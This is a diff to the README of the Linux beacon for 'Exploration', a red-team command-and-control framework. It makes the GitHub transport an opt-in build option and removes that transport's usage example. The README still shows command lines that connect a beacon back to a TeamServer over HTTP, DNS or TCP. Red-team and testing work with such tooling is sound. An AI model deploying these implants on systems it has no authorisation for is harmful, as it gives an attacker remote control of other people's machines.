@@ -4,7 +4,7 @@
 
 **Exploration** is a modular Command and Control (C2) framework designed for red team operations. This repository provides the **Beacon** component implemented in C++ for targeting Linux systems. The associated TeamServer and Client components are available in the [C2TeamServer](https://github.com/maxDcb/C2TeamServer) repository.
 
-Multiple Beacons in this project are capable of communicating with the TeamServer over various channels. Supported transport mechanisms include HTTP/HTTPS, GitHub, DNS, and TCP.
+Multiple Beacons in this project are capable of communicating with the TeamServer over various channels. Default transport mechanisms include HTTP/HTTPS, DNS, and TCP. The experimental GitHub transport is available only through an explicit build option.
 
 ## Communication Examples
 
@@ -13,10 +13,6 @@ Multiple Beacons in this project are capable of communicating with the TeamServe
 BeaconHttp <TEAMSERVER_IP> <LISTENER_PORT> <http|https>
 BeaconHttp 10.10.10.10 8443 https
 BeaconHttp 10.10.10.10 8080 http
-
-# GitHub
-BeaconGithub <GITHUB_USER/REPO> <ACCESS_TOKEN>
-BeaconGithub maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...
 
 # DNS
 BeaconDns <DNS_SERVER> <TEAMSERVER_DOMAIN>
@@ -39,6 +35,10 @@ This project utilizes several external libraries and tools:
 * [nlohmann/json](https://github.com/nlohmann/json): JSON parsing library.
 
 ### Building the Linux Beacons and Modules
+
+The experimental GitHub beacon is excluded by default. Add
+`-DC2_ENABLE_GITHUB_TRANSPORT=ON` during CMake configuration to build
+`BeaconGithub` for dedicated testing.
 
 Initialize submodules and prepare the build environment:
 
@@ -98,7 +98,6 @@ Release publication runs only from tag builds after CI succeeds. The archive is 
 Release/
   LinuxBeacons/
     BeaconDns
-    BeaconGithub
     BeaconHttp
     BeaconTcp
   LinuxModules/
